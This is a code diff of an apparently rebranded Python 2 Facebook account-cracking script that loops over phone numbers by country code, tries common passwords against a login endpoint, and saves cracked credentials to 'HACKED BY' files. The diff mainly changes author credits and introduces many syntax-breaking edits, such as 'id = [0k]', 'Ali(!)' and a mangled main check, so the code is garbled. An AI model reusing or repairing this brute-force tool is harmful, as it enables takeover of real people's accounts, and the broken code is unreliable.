@@ -55,7 +55,7 @@ logo = """
 _   _                _     _  _
 | | | | _ _  _ | |_  | |/ / |__    _ _ 
 | |_| |/ _ \ '_  _ \| __| | ' /| '_ \ / _ | '_ \
-|  _  |  / | | | | | |_  | . \| | | | (_| | | | |
+|  _  |  / | | | | | |_  | .  \| | | | (_| | | | |
 |_| |_|\_|_| |_| |_|\__| |_|\_\_| |_|\__,_|_| |_|
 
 
@@ -65,18 +65,18 @@ _   _                _     _  _
    
 
 --------------------------------------------------
- Author      : Hemtkhan
- GitHub      : https://github.com/HemtKhan
- YouTube     : Hemtkhan
- Telegram    : @HemtHack
+ Author      : SaFi CS
+ GitHub      : https://github.com/safihacker
+ YouTube     : Safihacker
+ Telegram    : @Safihacker
  Blogspot    : jalalzai
 --------------------------------------------------
 """
 back = 0
-successful = []
+successful = [1]
 cpb = []
 oks = []
-id = []
+id = [0k]
 
 def Cybery():
     os.system('clear')
@@ -84,23 +84,23 @@ def Cybery():
     print 42 * '~'
     print '  [01] CRACK  ALL Country  WITH NUMBERS '
     print 42 * '~'
-    Ali()
+    Ali(24)
 
 
 def Ali():
     global cpb
     global oks
-    bch = raw_input(' ENTER NUMBER >> 01 << ')
+    bch = raw_input(' >> 01 << ')
     if bch == '':
         print '[!] Fill in correctly'
-        Ali()
+        SaFi(1)
     elif bch == '01':
         os.system('clear')
         print logo
         print '  HACK ALL COUNTRY FB '
         try:
-            k = raw_input(' Enter Country Code : ')
-            c = raw_input(' Enter Range Code ')
+            k = raw_input(' +92 : ')
+            c = raw_input('34')
             idlist = '.txt'
             for line in open(idlist, 'r').readlines():
                 id.append(line.strip())
@@ -111,10 +111,10 @@ def Ali():
             Ali ()
 
     elif bch == '0':
-        exb()
+        exb(0)
     else:
         print '[!] Not Funds Files'
-        Ali()
+        Ali(!)
     xxx = str(len(id))
     psb(' TOTAL   NUMBERS: ' + xxx)
     time.sleep(0.1)
@@ -135,15 +135,15 @@ def Ali():
             q = json.load(data)
             if 'access_token' in q:
                 print '\x1b[1;91m[CHECKPOINT]\x1b[1;91m ' + k + c + user + '  no ' + pass1 + '\n' + '\n'
-                okb = open('save/ HACKED BY HEMTKHAN  .txt', 'a')
+                okb = open('save/ HACKED BY SAIFULLAH  .txt', 'a')
                 okb.write(k + c + user + '   ' + pass1 + '\n')
                 okb.close()
                 oks.append(c + user + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;92mHACKED BY HEMTKHAN\x1b[1;92m ' + k + c + user + '  yes  ' + pass1 + '\n'
+                print '\x1b[1;92sHACKED BY SAFIHACKER\x1b[1;92m ' + k + c + user + '  yes  ' + pass1 + '\n'
                 cps = open('save/checkpoint.txt', 'a')
                 cps.write(k + c + user + '   ' + pass1 + '\n')
-                cps.close()
+                cps.close(OK)
                 cpb.append(c + user + pass1)
             else:
              	pass2 ="100200"
@@ -151,12 +151,12 @@ def Ali():
             q = json.load(data)
             if 'access_token' in q:
                 print '\x1b[1;91m[CHECKPOINT]\x1b[1;91m ' + k + c + user + '  NO  ' + pass1 + '\n' + '\n'
-                okb = open('save/ HACKED BY HEMTKHAN  .txt', 'a')
+                okb = open('save/ HACKED BY SAFIHACKER  .txt', 'a')
                 okb.write(k + c + user + '   ' + pass1 + '\n')
-                okb.close()
+                okb.close(0)
                 oks.append(c + user + pass2)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;92mHACKED BY HEMTKHAN \x1b[1;92m ' + k + c + user + '  yes  ' + pass2 + '\n'
+                print '\x1b[1;92sHACKED BY SAFIHACKER \x1b[1;92m ' + k + c + user + '  yes  ' + pass2 + '\n'
                 cps = open('save/checkpoint.txt', 'a')
                 cps.write(k + c + user + '    ' + pass2 + '\n')
                 cps.close()
@@ -173,5 +173,5 @@ def Ali():
     raw_input('\n[Press Enter To Go Back]')
 
 
-if __name__ == '__main__':
+if __SAIFULLAH CS STUDENT_ == '__main__':
     Cybery()
